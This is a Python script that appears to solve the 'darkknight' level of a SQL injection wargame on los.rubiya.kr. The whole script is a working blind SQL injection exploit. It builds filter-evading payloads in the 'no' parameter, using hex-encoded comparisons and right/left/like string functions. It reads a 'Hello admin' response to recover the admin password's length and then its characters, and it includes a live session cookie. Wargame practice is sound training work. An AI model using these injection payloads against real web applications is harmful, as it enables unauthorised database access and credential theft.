import requests
import string

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookie = {'PHPSESSID': 'jett8kmnsi97cl8bu5naomvbdm'}

def pw_len():
    for pw_length in range(50):
        param = {"pw":"1","no":"0 || id<0x42 && length(pw) > {} #".format(pw_length)}
        req = requests.get(url, params=param, cookies=cookie)

        if "Hello admin" not in req.text:
            print("length:", pw_length)
            return pw_length

def pw_find():
    length = int(pw_len())
    password = ""
    for i in range(length):
        for value in range(33,127):
            if hex(value) == "0x25":
                continue
            param = {"pw":"1","no":"0 || id<0x42 && right(left(pw,{}),1)like({}) #".format(i+1, hex(value))}
            print(param)
            req = requests.get(url, params=param, cookies=cookie)
            if "Hello admin" in req.text:
                password += chr(value)
                break
    print("Password:", password)

pw_find()

#0b70ea1f